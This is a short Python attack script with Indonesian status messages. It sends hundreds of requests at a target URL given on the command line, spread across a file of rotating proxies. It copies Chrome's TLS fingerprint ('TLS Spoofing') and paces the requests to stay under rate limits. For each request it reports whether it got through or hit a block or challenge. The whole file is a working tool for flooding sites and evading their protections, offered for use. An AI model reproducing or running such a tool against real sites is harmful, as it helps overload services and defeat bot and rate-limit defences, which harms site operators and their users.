import time
import concurrent.futures
import sys
import random
from curl_cffi import requests

def get_random_headers():
    return {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

def attack_worker(target_url, proxy, req_id):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    headers = get_random_headers()
    
    try:
        resp = requests.get(
            target_url, 
            proxies=proxies, 
            headers=headers, 
            timeout=5, 
            impersonate="chrome124" 
        )
        if resp.status_code in [200, 301, 302]:
            print(f"[*] Node {proxy.split(':')[0]} | Req {req_id}:[{resp.status_code}] -> Tembus")
        else:
            print(f"[!] Node {proxy.split(':')[0]} | Req {req_id}: [{resp.status_code}] -> Block/Challenge")
    except Exception:
        pass

def load_live_proxies():
    try:
        with open("live_proxies.txt", "r") as f:
            return[line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        sys.exit(1)

def run_strike(target_url):
    proxy_pool = load_live_proxies()
    if not proxy_pool:
        sys.exit(1)
        
    estimated_refill_rate = 2 
    safe_delay = 1.0 / (len(proxy_pool) * estimated_refill_rate)
    
    print(f"[>] Mengunci Target (TLS Spoofing): {target_url}")
    print(f"[>] Amunisi Aktif: {len(proxy_pool)} Node | Pacing: {safe_delay:.4f}s")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(proxy_pool)) as executor:
        futures =[]
        for i in range(1, 501):
            current_proxy = proxy_pool[i % len(proxy_pool)]
            futures.append(executor.submit(attack_worker, target_url, current_proxy, i))
            time.sleep(safe_delay)
            
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    run_strike(sys.argv[1])